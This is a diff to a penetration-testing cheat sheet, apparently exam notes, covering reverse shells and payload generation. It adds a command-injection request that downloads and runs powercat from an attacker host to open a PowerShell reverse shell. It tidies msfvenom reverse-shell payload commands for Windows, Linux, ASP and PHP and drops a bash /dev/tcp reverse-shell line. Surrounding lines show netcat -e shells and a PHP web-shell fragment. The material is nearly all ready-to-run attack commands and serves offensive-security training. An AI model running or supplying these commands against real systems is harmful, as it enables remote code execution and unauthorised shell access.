@@ -378,7 +378,16 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     - Netcat: `nc -nv <KALI_IP> 6666 -e /bin/bash`  
   - Windows `echo %COMSPEC%`  
     - cmd.exe  
-    - PowerShell: `powercat -c <KALI_IP> -p 4444 -e powershell`  
+    - PowerShell:
+      `powercat -c <KALI_IP> -p 4444 -e powershell`
+      ```
+      #Kali
+      cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+      python3 -m http.server 80
+
+      #Target OS command injection
+      curl -X POST --data 'Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.170/powercat.ps1");powercat -c <kali> -p 4444 -e powershell' http://<target>:8000/archive  
+      ```
     - No PowerShell/PowerCat: `C:\Windows\Temp\nc64.exe <KALI_IP> 4444 -e C:\Windows\System32\cmd.exe`
   - Bypassing web applications (Command injection)
     1. create shell.ps1 on kali
@@ -419,13 +428,12 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
   **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
   **step 3 generate payload based on target platform**  
-  - windows32: 'msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
-  - windows64: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
+  - windows32: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
+  - windows64: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
   - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
   - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
   - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
   - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`  
-  - Bash RCE, command injection: `bash -i >& /dev/tcp/<KALI>/4444 0>&1`
     
 **Tips:**  
   - Always match LPORT between payload and nc  
